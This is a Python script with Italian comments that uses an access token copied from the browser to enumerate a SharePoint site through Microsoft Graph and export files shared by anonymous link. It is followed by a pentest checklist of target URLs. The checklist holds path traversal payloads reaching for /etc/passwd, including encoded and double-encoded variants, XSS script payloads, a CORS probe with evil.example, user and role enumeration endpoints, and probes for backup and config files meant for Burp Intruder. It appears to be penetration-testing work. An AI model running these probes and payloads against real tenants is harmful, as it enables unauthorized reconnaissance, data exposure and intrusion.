#!/usr/bin/env python3
"""
sp_anonymous_links_token.py

Versione adattata per usare un ACCESS TOKEN già ottenuto dall'interfaccia web (browser).
Scansiona SOLO il sito target e cerca link anonimi (scope == "anonymous") su drive items.
Tutte le operazioni sono in sola lettura.

Uso:
    python3 sp_anonymous_links_token.py --site https://comp.sharepoint.com/sites/appname --token <ACCESS_TOKEN>

Opzioni:
    --site    : URL del sito target (obbligatorio se non modificato nel DEFAULT_SITE)
    --token   : Bearer token Graph (consigliato). Se non fornito, lo script tenterà device code flow (come fallback).
    --limit   : max items per drive (default 300)
    --delay   : delay (s) tra richieste (default 0.4)
    --out     : CSV output (default anonymous_links.csv)

Requisiti:
    pip3 install requests tqdm
"""
import argparse
import time
import csv
import sys
from urllib.parse import urlparse
import requests
from tqdm import tqdm

GRAPH_ENDPOINT = "https://graph.microsoft.com/v1.0"

def parse_site(url):
    p = urlparse(url)
    hostname = p.netloc
    path = p.path
    if not path:
        raise ValueError("Site path non trovato. Usa formato https://<hostname>/sites/<name>")
    return hostname, path.rstrip("/")

def graph_get(url, token, params=None):
    headers = {"Authorization": f"Bearer {token}", "Accept": "application/json"}
    r = requests.get(url, headers=headers, params=params, timeout=30)
    if r.status_code == 401:
        raise RuntimeError("401 Unauthorized - token scaduto o scope mancanti")
    r.raise_for_status()
    return r.json()

def find_site_id(hostname, site_path, token):
    path_no_lead = site_path[1:] if site_path.startswith("/") else site_path
    # Tentativo 1: /sites/{hostname}:/{site_path}
    url = f"{GRAPH_ENDPOINT}/sites/{hostname}:/{path_no_lead}"
    try:
        obj = graph_get(url, token)
        return obj.get("id"), obj
    except Exception:
        pass
    # Tentativo 2: ricerca per nome
    last_component = path_no_lead.split("/")[-1]
    url2 = f"{GRAPH_ENDPOINT}/sites?search={last_component}"
    resp = graph_get(url2, token)
    for s in resp.get("value", []):
        if s.get("webUrl", "").endswith(site_path):
            return s.get("id"), s
    raise RuntimeError("Impossibile risolvere site id per %s%s" % (hostname, site_path))

def list_drives(site_id, token):
    url = f"{GRAPH_ENDPOINT}/sites/{site_id}/drives"
    resp = graph_get(url, token)
    return resp.get("value", [])

def list_drive_children(drive_id, token, top=200, limit_items=None, delay=0.4):
    items = []
    url = f"{GRAPH_ENDPOINT}/drives/{drive_id}/root/children"
    params = {"$top": top}
    seen = 0
    while url:
        resp = graph_get(url, token, params=params)
        for it in resp.get("value", []):
            items.append(it)
            seen += 1
            if limit_items and seen >= limit_items:
                return items
        url = resp.get("@odata.nextLink")
        params = None
        if url:
            time.sleep(delay)
    return items

def recurse_list_items(drive_id, token, folder_item, items_acc, limit_items, delay):
    url = f"{GRAPH_ENDPOINT}/drives/{drive_id}/items/{folder_item['id']}/children"
    params = {"$top": 200}
    while url:
        resp = graph_get(url, token, params=params)
        for it in resp.get("value", []):
            items_acc.append(it)
            if limit_items and len(items_acc) >= limit_items:
                return
            if it.get("folder"):
                time.sleep(delay)
                recurse_list_items(drive_id, token, it, items_acc, limit_items, delay)
                if limit_items and len(items_acc) >= limit_items:
                    return
        url = resp.get("@odata.nextLink")
        params = None

def get_item_permissions(drive_id, item_id, token):
    url = f"{GRAPH_ENDPOINT}/drives/{drive_id}/items/{item_id}/permissions"
    resp = graph_get(url, token)
    return resp.get("value", [])

def main():
    parser = argparse.ArgumentParser(description="Enumerazione link anonimi in un sito SharePoint (token-based)")
    parser.add_argument("--site", required=True, help="es: https://comp.sharepoint.com/sites/appname")
    parser.add_argument("--token", required=False, help="Bearer token (se non fornito, lo script fallisce)")
    parser.add_argument("--limit", type=int, default=300, help="max items per drive (default 300)")
    parser.add_argument("--delay", type=float, default=0.4, help="delay tra richieste (default 0.4s)")
    parser.add_argument("--out", default="anonymous_links.csv", help="CSV output")
    args = parser.parse_args()

    if not args.token:
        print("Errore: questo script richiede un access token (passa --token).")
        print("Vedi istruzioni in chat per estrarre token dal browser devtools.")
        sys.exit(1)

    hostname, site_path = parse_site(args.site)
    print(f"[+] Target: {hostname}{site_path}")
    token = args.token.strip()

    print("[+] Risolvo site id...")
    site_id, site_obj = find_site_id(hostname, site_path, token)
    print(f"[+] Site trovato: id={site_id}, title={site_obj.get('displayName')}")

    print("[+] Elenco drives (document libraries)...")
    drives = list_drives(site_id, token)
    print(f"[+] {len(drives)} drives trovati.")
    results = []

    for drive in drives:
        drive_id = drive.get("id")
        drive_name = drive.get("name")
        print(f"[+] Enumerazione drive: {drive_name} (id={drive_id})")
        items = list_drive_children(drive_id, token, top=200, limit_items=args.limit, delay=args.delay)
        all_items = list(items)
        for it in items:
            if args.limit and len(all_items) >= args.limit:
                break
            if it.get("folder"):
                time.sleep(args.delay)
                recurse_list_items(drive_id, token, it, all_items, args.limit, args.delay)
        print(f"    -> {len(all_items)} items raccolti (limit {args.limit})")

        for it in tqdm(all_items, desc=f"Perms {drive_name}", unit="item"):
            time.sleep(args.delay)
            try:
                perms = get_item_permissions(drive_id, it["id"], token)
            except Exception as e:
                print(f"Warning: errore ottenendo permissions per item {it.get('name')} : {e}")
                continue
            for p in perms:
                link = p.get("link")
                if link:
                    scope = link.get("scope")
                    link_type = link.get("type")
                    web_url = link.get("webUrl")
                    if scope and scope.lower() == "anonymous":
                        results.append({
                            "drive": drive_name,
                            "item_name": it.get("name"),
                            "item_id": it.get("id"),
                            "permission_id": p.get("id"),
                            "link_scope": scope,
                            "link_type": link_type,
                            "link_webUrl": web_url
                        })

    if results:
        keys = ["drive","item_name","item_id","permission_id","link_scope","link_type","link_webUrl"]
        with open(args.out, "w", newline="", encoding="utf-8") as fh:
            writer = csv.DictWriter(fh, fieldnames=keys)
            writer.writeheader()
            for r in results:
                writer.writerow(r)
        print(f"[+] Trovati {len(results)} link anonimi. Esportati in {args.out}")
    else:
        print("[+] Nessun anonymous link trovato nei items scansionati (risultati vuoti).")

if __name__ == "__main__":
    main()


'''
# BASE: sostituisci con il tuo sito target
BASE=https://comp.sharepoint.com/sites/appname

# 1 - SharePoint REST API (info/list)
$BASE/_api/web
$BASE/_api/web/lists
$BASE/_api/web/lists?$filter=BaseTemplate eq 101
$BASE/_api/web/lists?$select=Title,Id,RootFolder/ServerRelativeUrl&$expand=RootFolder

# 2 - _layouts/15 pages (admin/view)
$BASE/_layouts/15/viewlsts.aspx
$BASE/_layouts/15/settings.aspx
$BASE/_layouts/15/people.aspx
$BASE/_layouts/15/AccessDenied.aspx

# 3 - _vti_bin web services (soap)
$BASE/_vti_bin/Lists.asmx
$BASE/_vti_bin/Lists.asmx?op=GetList
$BASE/_vti_bin/people.asmx
$BASE/_vti_bin/SiteData.asmx

# 4 - Search API
$BASE/_api/search/query?querytext='test'
$BASE/_api/search/query?querytext='confidential'
$BASE/_api/search/query?querytext='path:$BASE'

# 5 - Drives / Files (Graph-style endpoints via REST fallback)
$BASE/_api/web/GetFileByServerRelativeUrl('/sites/appname/Shared%20Documents/filename.txt')
$BASE/_api/web/GetFolderByServerRelativeUrl('/sites/appname/Shared%20Documents')

# 6 - Sharing / GetSharingInformation (marker; richiede auth/cookies)
# (POST to GetSharingInformation for list items; example path skeleton)
$BASE/_api/web/Lists(guid'<LIST_GUID>')/GetItemById(<ITEM_ID>)/GetSharingInformation

# 7 - Attachments handler (path traversal tests - conservative)
$BASE/Lists/GAM2/Attachments/37756/../../../../../../etc/passwd
$BASE/Lists/GAM2/Attachments/37756/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
$BASE/Lists/GAM2/Attachments/37756/%252e%252e/%252e%252e/%252e%252e/etc/passwd
$BASE/Lists/GAM2/Attachments/37756/..%5C..%5C..%5Cetc/passwd

# 8 - Common query parameters to check (use one at a time)
$BASE/search.aspx?q=MARKER_REAL            # raw tag test: ?q=</span><h1>MARKER_REAL</h1>
$BASE/search.aspx?q=%3C%2Fspan%3E%3Ch1%3EMARKER_REAL%3C%2Fh1%3E
$BASE/search.aspx?q=%26lt%3Bimg%20src%3Dx%20alt%3DTEST%26gt%3B   # escaped marker

# 9 - Upload / forms / context
$BASE/_layouts/15/Upload.aspx
$BASE/_api/contextinfo    # POST: get FormDigestValue (CSRF token)

# 10 - Catalogs / design / assets
$BASE/_catalogs/masterpage
$BASE/_catalogs/theme/15
$BASE/SiteAssets
$BASE/SitePages
$BASE/Pages

# 11 - List endpoints and form views
$BASE/_api/web/lists(guid'<LIST_GUID>')/items?$top=10
$BASE/_api/web/lists/getbytitle('Documenti')/items?$select=Id,FileLeafRef,FileRef

# 12 - People / user info
$BASE/_api/web/siteusers
$BASE/_api/web/siteusers?$filter=Id eq 1
$BASE/_api/web/currentuser

# 13 - Potentially sensitive legacy files (check safe existence only)
$BASE/web.config                               # check via 404 only (do not attempt download)
$BASE/backup.zip                               
$BASE/*.bak

# 14 - CORS / Origin checks (use as curl header test, not a URL)
#   curl -I -H "Origin: https://evil.example" "$BASE/_api/web"
#   check Access-Control-Allow-Origin and Access-Control-Allow-Credentials

# 15 - HTTP2 vs HTTP1.1 sanity tests (use curl flags)
#   curl -v --http1.1 "$BASE/Lists/GAM2/Attachments/37756/../../../../../../etc/passwd"
#   curl -v --http2 "$BASE/Lists/GAM2/Attachments/37756/../../../../../../etc/passwd"

# 16 - Encoded marker payloads for XSS detection (url-encoded)
$BASE/search.aspx?q=%26lt%3B%2Fspan%26gt%3B%26lt%3Bh1%26gt%3EMARKER1%26lt%3B%2Fh1%26gt%3B
$BASE/search.aspx?q=%26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B   # only for encoding check, do NOT expect execution

# 17 - Double-encoded / mixed separators (traversal fingerprint)
$BASE/Lists/GAM2/Attachments/37756/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
$BASE/Lists/GAM2/Attachments/37756/%2e%2e%5C%2e%2e/etc/passwd

# 18 - Search results & file downloads (read-only)
$BASE/_layouts/15/Download.aspx?SourceUrl=/sites/appname/Shared%20Documents/filename.txt    # check response code only

# 19 - Misc useful endpoints
$BASE/_api/web/AvailableContentTypes
$BASE/_api/web/roledefinitions
$BASE/_api/web/roleassignments

# 20 - Admin / tenant indicative endpoints (do not brute)
https://<tenant>-admin.sharepoint.com/_layouts/15/online/SiteCollections.aspx   # admin UI (check only if allowed)

# ======= End of list =======
# NOTES:
# - Sostituisci BASE con il tuo target. Dove appare <LIST_GUID> o <ITEM_ID> inserisci valori trovati con enumeration.
# - Quando usi payload con '<' '>' usa sempre l'encoding URL per non inviare tag eseguibili.
# - Usa questi URL come input per Burp Intruder / Repeater in modalità manuale, 1 per 1, con delay 800-1000 ms.
# - Logga i risultati raw (status, headers, body snippet), salva HAR e screenshot DOM quando applichi marker XSS.
# - Non eseguire upload di file eseguibili in prod. Non tentare brute-force di account.
'''
